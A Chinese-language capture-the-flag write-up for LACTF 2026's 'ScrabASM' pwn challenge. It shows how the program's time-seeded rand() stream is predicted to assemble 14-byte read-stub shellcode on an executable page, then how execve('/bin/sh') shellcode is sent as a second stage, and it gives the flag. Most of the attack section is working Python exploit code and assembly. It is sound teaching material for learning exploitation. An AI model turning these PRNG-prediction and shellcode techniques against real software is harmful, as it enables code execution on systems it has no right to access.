# Writeup — ScrabASM (LACTF 2026, pwn/medium)

## 漏洞：可控 RWX 頁被當函式呼叫，但位元組來自 rand()

`chall.c` 的核心：

```c
#define BOARD_ADDR 0x13370000UL
#define HAND_SIZE 14

srand(time(NULL));
for (int i = 0; i < HAND_SIZE; i++) hand[i] = rand() & 0xFF;   // 初始 14 tiles

// swap_tile:
hand[idx] = rand() & 0xFF;      // 只能 reroll，不能直接指定值

// play():
void *board = mmap((void*)BOARD_ADDR, 0x1000,
                   PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
memcpy(board, hand, HAND_SIZE);
((void (*)(void))board)();      // 直接執行 14 bytes 手牌
```

我們完全控制被執行的 14 個位元組，但每個位元組是 `rand()&0xFF` 的輸出，只能靠 swap 重抽。關鍵在 `srand(time(NULL))` 種子可預測、`rand()` 序列可完整重現。

## 同步 PRNG

用本地 libc 的 `srand/rand` 重現伺服器序列：

```python
from ctypes import CDLL
import time as _time
libc = CDLL("./libc.so.6")
seed = int(_time.time())
libc.srand(seed)
hand = [libc.rand() & 0xFF for _ in range(14)]   # 預測初始手牌
```

解析程式印出的實際手牌；若因 1 秒競態不合，就嘗試 `seed` 偏移 `-1,+1,-2,+2` 重新對齊。對齊後，之後每次 `1) Swap` 消耗的下一個 `rand()&0xFF` 也都可預測。

## 第一階段 shellcode（正好 14 bytes）

目標是一段「read stub」：讀更多 shellcode 到自己正後方，然後 fall-through 執行它。

```asm
xor eax, eax          ; 31 c0          rax = 0 (SYS_read)
cdq                   ; 99             rdx = 0（先清）
xor edi, edi          ; 31 ff          rdi = 0 (stdin)
mov esi, 0x1337000e   ; be 0e 00 37 13 rsi = BOARD_ADDR + 14（寫到 stub 之後）
mov dl,  0xff         ; b2 ff          rdx = 0xff（長度）
syscall               ; 0f 05
```

合計 14 bytes：`31c0 99 31ff be0e003713 b2ff 0f05`。`read(0, 0x1337000e, 0xff)` 把 stage-2 讀進緊接的位址，syscall 返回後控制流自然落入剛讀進來的 stage-2。

## 把 14 個 tile 逼成 stage-1

比對「預測手牌」與「stage-1 目標位元組」，記下每個需要修改的 tile 位置與想要的位元組值。接著沿著可預測的 `rand()` 串流貪婪配對：

```python
from collections import defaultdict
remaining = {i: stage1[i] for i in range(14) if hand[i] != stage1[i]}
need = defaultdict(set)
for i, b in remaining.items(): need[b].add(i)

while remaining:
    next_val = libc.rand() & 0xFF          # 下一次 swap 會抽到的值
    if next_val in need and need[next_val]:
        tile = need[next_val].pop()        # 剛好是某個需要此值的 tile
        if not need[next_val]: del need[next_val]
        del remaining[tile]
    else:
        tile = next(iter(remaining))       # 否則把這次 swap「浪費」在任一待修 tile
    r.sendline(b'1'); r.sendline(str(tile).encode())
```

每次 swap 恰好消耗一個 `rand()`；若下一個值正是某 tile 所需就把它 swap 到那個位置，否則浪費在任一未完成的 tile（之後對的值出現時再修）。跑完後 14 個 tile == stage-1。

## 觸發並送第二階段

```python
r.sendline(b'2')                       # Play!
r.recvuntil(b'TRIPLE WORD SCORE!')
stage2 = asm(shellcraft.sh())          # execve("/bin/sh", 0, 0)
r.send(stage2)                         # 被 stage-1 的 read() 收下並執行
r.interactive()                        # cat flag.txt
```

stage-1 執行後停在 `read()` 等輸入；送入完整的 `execve("/bin/sh")` shellcode，fall-through 執行即得 shell，`cat flag.txt`。

## Flag

`lactf{gg_y0u_sp3ll3d_sh3llc0d3}`
